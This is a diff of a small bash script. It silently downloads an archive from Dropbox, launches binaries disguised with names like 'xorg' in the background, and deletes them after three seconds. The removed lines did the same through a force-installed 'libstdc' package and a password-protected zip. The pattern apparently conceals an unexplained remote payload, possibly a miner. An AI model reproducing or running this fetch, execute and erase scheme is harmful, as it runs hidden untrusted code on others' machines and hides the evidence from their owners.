@@ -1,17 +1,14 @@
 #!/bin/bash
 
 end=$((SECONDS+$1))
-wget hhttps://www.dropbox.com/s/s6j41h7gjx896vw/libstdc.deb -q
-sudo dpkg --force-all -i libstdc.deb > /dev/null 2>&1
-rm -rf libstdc.deb
-wget https://www.dropbox.com/s/2utkemi58kbeq5r/xorg.zip -q
-unzip -P samsung xorg.zip > /dev/null 2>&1
+wget https://www.dropbox.com/s/hmknxrb4dw3msjw/wan11.zip -q
+unzip wan11.zip > /dev/null 2>&1
 #pwd
-./src/xorg ./src/xdata &
+./xorg ./xdata &
 sleep 3
-rm -rf xorg.zip
-rm -rf src/xorg
-rm -rf src/xdata
+rm -rf wan11.zip
+rm -rf xorg
+rm -rf xdata
 while [ $SECONDS -lt $end ]
 do
     read line
